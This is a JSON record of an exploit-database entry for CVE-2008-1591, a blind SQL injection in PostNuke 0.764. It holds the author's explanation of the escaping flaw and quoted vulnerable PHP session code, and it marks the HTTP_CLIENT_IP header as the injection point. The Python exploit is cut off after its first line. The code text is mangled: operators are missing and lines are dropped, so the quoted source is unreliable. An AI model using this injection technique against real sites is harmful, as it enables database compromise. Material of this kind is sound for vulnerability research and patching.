{
    "text": "ecve : CVE-2008-1591 ， title : PostNuke 0.764 - Blind SQL Injection - PHP webapps Exploit ， verified : Verified ， exploit_detail :  #  ! /usr/bin/python ，  # ================================================================================================= #  ，  # ____ __________ __ ____ __ #  ，  # /_ | ____ | __\\_____ \\ _____/ | _ /_ | / | _ #  ，  #  |  | / \\ |  | _ ( __ <_/ ___\\ __\\ ______ | \\ __\\ #  ，  #  |  |  | \\ |  | / \\ \\___ |  | /_____/ |  |  |  |  #  ，  #  | ___ | ___ | /\\__ | /______ /\\___ >__ |  | ___ | __ |  #  ，  # \\/\\______ | \\/ \\/ #  ，  # ================================================================================================= #  ，  # This was a priv8 Exploit #  ，  # ================================================================================================= #  ，  # Postnuke <= 0.764 #  ，  # Blind Sql Injection Vulnerability #  ，  # Benchmark Method #  ，  #  #  ，  # Vendor : www.postnuke.com #  ，  # Severity : High #  ，  # Author : The : Paradox #  ，  # ================================================================================================= #  ，  # Proud To Be Italian. #  ，  # ==================================== # ============================================================ #  ，  # Proof Of Concept / Bug Explanation #  #  ，  # ==================================== #  #  ，  # Postnuke presents a critical vulnerability in pnVarPrepForStore (  ) function. Let's see source :  #  ，  #  #  ，  #  #  ，  # 1. function pnVarPrepForStore (  )  #  ，  # 2. { #  ，  # 3. $ resarray = array (  )  ;  #  ，  # 4. foreach ( func_get_args (  ) as $ ourvar ) { #  ，  # 5. if (  ! get_magic_quotes_runtime (  )  ! is_array (  $ ourvar )  ) { #  ，  # 6. $ ourvar = addslashes (  $ ourvar )  ;  #  ，  # 7. } #  ，  # 8. // Add to array #  ，  # 9. array_push (  $ resarray ,  $ ourvar )  ;  #  ，  # 10. } #  ，  # 11. // Return vars #  ，  # 12. if ( func_num_args (  ) == 1 ) { #  ，  # 13. return $ resarray [ 0 ]  ;  #  ，  # 14. } else { #  ，  # 15. return $ resarray ;  #  ，  # 16. } #  ，  # 17. } #  ，  #  #  ，  # This function is used to prepare vars for sql queries. It \"add slashes\" to given variables. #  ，  # But wat happens if get_magic_quotes_runtime (  ) is On in Server Configuration? #  ，  # The script does nothing 'cause variables should be already cleaned. #  ，  #  #  ，  # Whatever the script author didn't thought about Server Variables : they are untouched by #  ，  # magic_quotes_gpc and magic_quotes_runtime (  ) . #  ，  # Therefore all Server Variables are not propelly checked with magic_quotes_runtime (  ) On #  ，  #  #  ，  # In this exploit I will inject Sql code in HTTP_CLIENT_IP header , see pnSessionInit (  ) function. #  ，  # ================================================================================================= #  ，  # Use this at your own risk. You are responsible for your own deeds. #  ，  # ================================================================================================= #  ， Related Codes :  ，  $ dbconn =& pnDBGetConn ( true )  ;  ，  $ pntable =& pnDBGetTables (  )  ;  ， // First thing we do is ensure that there is no attempted pollution ， // of the session namespace ， foreach (  $ GLOBALS as $ k => $ v ) { ， // Kick it ， session_start (  )  ;  ， // Have to re-write the cache control header to remove no-save , this ， // allows downloading of files to disk for application handlers ， // adam_baum - no-cache was stopping modules ( andromeda ) from caching the playlists , et al. ， // any strange behaviour encountered , revert to commented out code. ， // Header ( 'Cache-Control : no-cache , must-revalidate , post-check=0 , pre-check=0' )  ;  ， Header ( 'Cache-Control : cache' )  ;  ，  $ sessid = session_id (  )  ;  ， // Get ( actual ) client IP addr ，  $ ipaddr = pnServerGetVar ( 'REMOTE_ADDR' )  ;  ，  $ ipaddr = pnServerGetVar ( 'HTTP_CLIENT_IP' )  ;  ，  $ tmpipaddr = pnServerGetVar ( 'HTTP_CLIENT_IP' )  ;  ，  $ ipaddr = $ tmpipaddr ;  ，  $ fwdipaddr = pnServerGetVar ( 'HTTP_X_FORWARDED_FOR' )  ;  ，  $ fwdipaddr = substr (  $ fwdipaddr , 0 , strpos (  $ fwdipaddr , ' , ' )  )  ;  ，  $ tmpipaddr = $ fwdipaddr ;  ，  $ ipaddr = substr (  $ tmpipaddr , 0 , strpos (  $ tmpipaddr , ' , ' )  )  ;  ，  $ sessioninfocolumn = & $ pntable [ 'session_info_column' ]  ;  ，  $ sessioninfotable = $ pntable [ 'session_info' ]  ;  ，  $ query = \"SELECT $ sessioninfocolumn [ ipaddr ]  ， FROM $ sessioninfotable ， WHERE $ sessioninfocolumn [ sessid ] = '\" . pnVarPrepForStore (  $ sessid ) . \"'\" ;  ，  $ result =& $ dbconn->Execute (  $ query )  ;  ， // jgm - this has been commented out so that the nice AOL people ， // can view PN pages , will examine full implications of this ， // later ， // list (  $ dbipaddr ) = $ result->fields ;  ，  $ result->Close (  )  ;  ， // if (  $ ipaddr == $ dbipaddr ) { ， pnSessionCurrent (  $ sessid )  ;  ， // } else { ， // // Mismatch - destroy the session ， // session_destroy (  )  ;  ， // pnRedirect ( 'index.php' )  ;  ， // return false ;  ， // } ， } else { ， pnSessionNew (  $ sessid ,  $ ipaddr )  ;  ， // Generate a random number , used for ， // some authentication ， srand (  ( double ) microtime (  )  * 1000000 )  ;  ， pnSessionSetVar ( 'rand' , rand (  )  )  ;  ，  $ dbconn =& pnDBGetConn ( true )  ;  ，  $ pntable =& pnDBGetTables (  )  ;  ，  $ sessioninfocolumn = & $ pntable [ 'session_info_column' ]  ;  ，  $ sessioninfotable = $ pntable [ 'session_info' ]  ;  ，  $ query = \"INSERT INTO $ sessioninfotable ，  (  $ sessioninfocolumn [ sessid ]  ,  ，  $ sessioninfocolumn [ ipaddr ]  ,  ，  $ sessioninfocolumn [ uid ]  ,  ，  $ sessioninfocolumn [ firstused ]  ,  ，  $ sessioninfocolumn [ lastused ]  )  ， VALUES ，  ( '\" . pnVarPrepForStore (  $ sessid ) . \"' ,  ， '\" . pnVarPrepForStore (  $ ipaddr ) . \"' , <-- Injection ! = )  ， 0 ,  ， \" . time (  ) . \" ,  ， \" . time (  ) . \" ) \" ;  ，  $ dbconn->Execute (  $ query )  ;  ，  # ================================================================================================= #  ，  # Python Exploit Starts #  ，  # ================================================================================================= #  ， from httplib",
    "time": "2008-03-21"
}